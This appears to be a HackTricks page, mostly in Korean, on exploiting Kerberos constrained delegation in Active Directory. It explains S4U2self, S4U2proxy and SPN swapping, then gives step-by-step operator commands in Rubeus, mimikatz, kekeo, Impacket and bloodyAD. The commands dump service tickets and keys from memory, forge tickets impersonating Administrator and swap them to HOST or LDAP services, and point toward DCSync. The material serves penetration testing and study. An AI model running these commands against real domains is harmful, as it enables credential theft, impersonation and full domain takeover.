# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

이를 사용하면 Domain admin이 컴퓨터가 어떤 머신의 **service**에 대해서든 **user 또는 computer를 impersonate**하도록 **허용**할 수 있습니다.

- **Service for User to self (_S4U2self_):** **SPN을 소유한 service account**는 일반적으로 임의의 user를 대신하여 자기 자신에 대한 TGS를 얻을 수 있습니다. 해당 account의 _userAccountControl_에 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)이 설정되어 있으면 해당 TGS는 **forwardable**이 되며, 이것이 **classic constrained delegation**에서 protocol transition을 직접 유용하게 만드는 요소입니다.
- **Service for User to Proxy(_S4U2proxy_):** **service account**는 **msDS-AllowedToDelegateTo**에 나열된 SPN에 대해 user를 대신하는 TGS를 얻을 수 있습니다. S4U2Proxy에서 사용하는 evidence ticket은 delegating service로 향하는 **forwardable** ticket이어야 합니다. 이는 victim에서 캡처한 실제 client-to-service ticket이거나 **S4U2Self + T2A4D**로 생성한 ticket이어야 합니다.

**Note**: AD에서 user가 ‘_Account is sensitive and cannot be delegated_’로 표시되어 있거나 **Protected Users**의 구성원인 경우, constrained delegation을 통해 해당 user를 **impersonate**할 수 없는 경우가 많습니다. 최신 도메인에서는 delegation이 활성화된 account를 대상으로 할 때 RC4만을 가정하기보다 **AES** material을 우선 사용하세요.

즉, **service의 hash를 compromise**하면 user를 **impersonate**하고, 해당 user를 대신하여 지정된 머신의 모든 **service**에 **access**를 얻을 수 있습니다(잠재적인 **privesc**).

또한 user가 impersonate할 수 있는 service뿐만 아니라 **모든 service**에 access할 수 있습니다. SPN(service name requested)이 검사되지 않기 때문입니다(ticket에서 이 부분은 암호화되거나 서명되지 않습니다). 따라서 **CIFS service**에 access할 수 있다면, 예를 들어 Rubeus에서 `/altservice` flag를 사용하여 **HOST service**에도 access할 수 있습니다. 동일한 SPN swapping weakness는 **Impacket getST -altservice** 및 기타 tooling에서도 악용됩니다.

또한 **DC에서 LDAP service access**를 확보하는 것이 **DCSync**를 exploit하는 데 필요합니다.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**운영자 참고:** **gMSA/sMSA** 검토 시 **ADUC** 또는 BloodHound 스크린샷만 신뢰하지 마세요. 이러한 계정에는 일반적인 위임 탭이 표시되지 않는 경우가 많으므로, 원시 **`userAccountControl`** 및 **`msDS-AllowedToDelegateTo`** 특성을 직접 열거하세요.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

손상된 계정에 **T2A4D**가 있으면 일반적으로 service key/TGT만으로 전체 **`S4U2Self -> S4U2Proxy`** chain을 완료할 수 있습니다.<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`**만 있는 경우(기존 **"Use Kerberos only"** mode)에도 delegation을 악용할 수 있지만, S4U2Proxy의 evidence ticket은 delegating service를 대상으로 하는 **실제 forwardable user-to-service ticket**이어야 합니다. 실제로는 victim TGS를 **LSASS/ccache**에서 훔치거나 캡처한 다음, 이를 second stage의 (`/tgs:` in Rubeus) 입력으로 전달해야 합니다. **non-forwardable** S4U2Self ticket은 classic constrained delegation에 충분하지 않습니다. 이것이 유일한 evidence ticket이라면 대신 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)을 확인하세요.<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2**부터 KDC는 S4U2Proxy extensions를 통해 **domains/forests 간 constrained delegation**을 지원합니다. 최신 builds (Windows Server 2016–2025)는 이 동작을 유지하며 protocol transition을 나타내는 두 개의 PAC SIDs를 추가합니다.<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) 일반적인 방식으로 user가 authenticated된 경우.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) service가 protocol transition을 통해 identity를 asserted한 경우.

domains 간에 protocol transition이 사용되면 PAC 내부에서 `SERVICE_ASSERTED_IDENTITY`를 확인할 수 있으며, 이는 S4U2Proxy step이 성공했음을 의미합니다.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

최신 Impacket (0.11.x+)은 Rubeus와 동일한 S4U chain 및 SPN swapping을 제공합니다.<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
사용자 ST를 먼저 forge하는 것을 선호한다면(예: offline hash만 있는 경우), **ticketer.py**를 **getST.py**와 함께 사용하여 S4U2Proxy를 수행하세요. 이미 작동하는 ccache가 있고 동일한 호스트에 대한 service class만 바꾸면 되는 경우에는 **tgssub.py**도 유용합니다. 현재 발생하는 특이 사항은 공개된 Impacket issue #1713을 참조하세요(위조한 ST가 SPN key와 일치하지 않을 때 발생하는 KRB_AP_ERR_MODIFIED).<sup>[[2]](#references)</sup>

### 낮은 권한 자격 증명을 사용한 delegation setup 자동화

컴퓨터 또는 service account에 대해 이미 **GenericAll/WriteDACL** 권한을 보유하고 있다면, **bloodyAD**(2024년 이상)를 사용하여 RSAT 없이 원격으로 필요한 attributes를 설정할 수 있습니다:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
이를 통해 해당 attributes에 write할 수 있게 되는 즉시 DA privileges 없이 privesc를 위한 constrained delegation 경로를 구축할 수 있습니다.

- Step 1: **허용된 service의 TGT 가져오기**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 컴퓨터에서 SYSTEM 권한 없이 **TGT ticket** 또는 **RC4**나 **AES256**을 얻을 수 있는 **다른 방법**도 있습니다. 예를 들면 Printer Bug 및 unconstrain delegation, NTLM relaying, Active Directory Certificate Service abuse 등이 있습니다.
>
> **해당 TGT ticket(또는 hash)만 있으면 컴퓨터 전체를 compromise하지 않고도 이 공격을 수행할 수 있습니다.**

- Step2: **사용자를 impersonating하여 service에 대한 TGS 얻기**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team에서 더 많은 정보를 확인할 수 있습니다.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 및 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation 개요 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket을 사용한 Delegation 악용 (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Offensive Kerberos 개요 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
